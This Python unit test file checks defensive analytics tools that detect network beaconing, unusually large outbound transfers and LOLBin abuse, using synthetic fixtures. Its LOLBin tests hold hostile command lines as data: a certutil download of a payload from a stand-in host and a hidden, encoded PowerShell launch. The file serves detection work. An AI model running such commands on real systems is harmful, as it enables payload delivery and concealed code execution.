"""
Unit tests for the network and endpoint behaviour analytics tools.

Fixtures are synthetic and independently authored: addresses come from the
TEST-NET-1 documentation block (RFC 5737) and RFC 1918 space, with invented
hostnames and timestamps. They exercise pattern CLASSES (periodic beaconing,
volume outliers, LOLBin abuse idioms) rather than reproducing any dataset.
"""

from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone

from src.core.evidence import EvidenceEvent, get_store
from src.registry.tools.network_analytics import (
    analyze_traffic_patterns,
    detect_lolbin_activity,
)

BASE = datetime(2031, 5, 4, 9, 0, 0, tzinfo=timezone.utc)


def at(seconds: int) -> str:
    return (BASE + timedelta(seconds=seconds)).isoformat()


def flow(
    *,
    offset: int,
    src: str = "10.50.4.21",
    dst: str = "192.0.2.150",
    port: int = 443,
    sent: int = 1200,
) -> EvidenceEvent:
    return EvidenceEvent(
        timestamp=at(offset),
        src_ip=src,
        dst_ip=dst,
        dst_port=port,
        protocol="tcp",
        bytes_sent=sent,
        source_type="synthetic_firewall",
    )


def proc(*, offset: int, process: str, command: str, parent: str = "explorer.exe") -> EvidenceEvent:
    return EvidenceEvent(
        timestamp=at(offset),
        host="WS-SYNTH-01",
        user="lmarchetti",
        process=process,
        parent_process=parent,
        command_line=command,
        action="process_create",
        source_type="synthetic_endpoint",
    )


def store_with(events: list[EvidenceEvent], run: str):
    get_store(run).append(events)


def payload(result: str) -> dict:
    return json.loads(result.split("```json", 1)[1].rsplit("```", 1)[0])


# ── beaconing ────────────────────────────────────────────


async def test_regular_interval_flow_detected_as_beacon():
    events = [flow(offset=i * 60) for i in range(10)]
    store_with(events, "beacon-run")

    data = payload(await analyze_traffic_patterns(_run_id="beacon-run"))
    assert data["beaconing"], "a fixed 60s callback cycle must be detected"
    beacon = data["beaconing"][0]
    assert beacon["mean_interval_seconds"] == 60.0
    assert beacon["jitter_ratio"] == 0.0
    assert beacon["callbacks"] == 10
    assert all(e.startswith("EV-") for e in beacon["evidence"])


async def test_irregular_human_traffic_is_not_a_beacon():
    offsets = [0, 7, 340, 355, 1200, 5000, 5003, 9000]
    store_with([flow(offset=o) for o in offsets], "jitter-run")

    data = payload(await analyze_traffic_patterns(_run_id="jitter-run"))
    assert not data["beaconing"]


async def test_too_few_events_cannot_establish_a_cycle():
    store_with([flow(offset=i * 60) for i in range(3)], "short-run")

    data = payload(await analyze_traffic_patterns(_run_id="short-run"))
    assert not data["beaconing"]


# ── transfers ────────────────────────────────────────────


async def test_large_outbound_transfer_flagged_as_outlier():
    events = [flow(offset=i * 90, dst=f"192.0.2.{10 + i}", sent=5_000) for i in range(12)]
    events.append(flow(offset=2000, dst="192.0.2.200", port=8443, sent=450_000_000))
    store_with(events, "exfil-run")

    data = payload(await analyze_traffic_patterns(_run_id="exfil-run"))
    assert data["transfers"], "a 450 MB egress against a 5 KB baseline must be flagged"
    top = data["transfers"][0]
    assert top["dst_ip"] == "192.0.2.200"
    assert top["megabytes_sent"] == 450.0


async def test_small_transfers_are_not_flagged():
    store_with([flow(offset=i * 90, sent=2_000) for i in range(10)], "small-run")

    data = payload(await analyze_traffic_patterns(_run_id="small-run"))
    assert not data["transfers"]


async def test_empty_store_refuses_traffic_analysis():
    result = await analyze_traffic_patterns(_run_id="empty-traffic-run")
    assert "ingest_logs" in result


async def test_no_network_events_reports_missing_telemetry():
    store_with([proc(offset=0, process="notepad.exe", command="notepad.exe")], "noflow-run")

    result = await analyze_traffic_patterns(_run_id="noflow-run")
    assert "no network telemetry available" in result.lower()


# ── LOLBins ──────────────────────────────────────────────


async def test_download_capable_binary_with_abuse_argument_detected():
    store_with(
        [
            proc(
                offset=0,
                process="C:\\Windows\\System32\\certutil.exe",
                command="certutil.exe -urlcache -split -f http://192.0.2.200/payload.bin a.bin",
            )
        ],
        "lolbin-run",
    )

    data = payload(await detect_lolbin_activity(_run_id="lolbin-run"))
    assert data["detections"], "certutil with -urlcache must be detected"
    hit = data["detections"][0]
    assert hit["binary"] == "certutil.exe"
    assert "download" in hit["capabilities"]
    assert hit["executions_with_abuse_indicators"] == 1
    assert hit["occurrences"][0]["evidence"].startswith("EV-")


async def test_dual_use_binary_without_abuse_idiom_is_not_asserted_malicious():
    store_with(
        [proc(offset=0, process="C:\\Windows\\System32\\whoami.exe", command="whoami")],
        "lolbin-benign-run",
    )

    data = payload(await detect_lolbin_activity(_run_id="lolbin-benign-run"))
    hit = data["detections"][0]
    assert hit["executions_with_abuse_indicators"] == 0
    assert "not a verdict" in data["note"]


async def test_encoded_powershell_flagged():
    store_with(
        [
            proc(
                offset=0,
                process="powershell.exe",
                command="powershell.exe -nop -w hidden -enc SQBFAFgA",
            )
        ],
        "lolbin-ps-run",
    )

    data = payload(await detect_lolbin_activity(_run_id="lolbin-ps-run"))
    hit = data["detections"][0]
    assert hit["binary"] == "powershell.exe"
    assert len(hit["occurrences"][0]["suspicious_arguments"]) >= 2


async def test_no_process_events_reports_missing_telemetry():
    store_with([flow(offset=0)], "noproc-run")

    result = await detect_lolbin_activity(_run_id="noproc-run")
    assert "no endpoint process telemetry available" in result.lower()
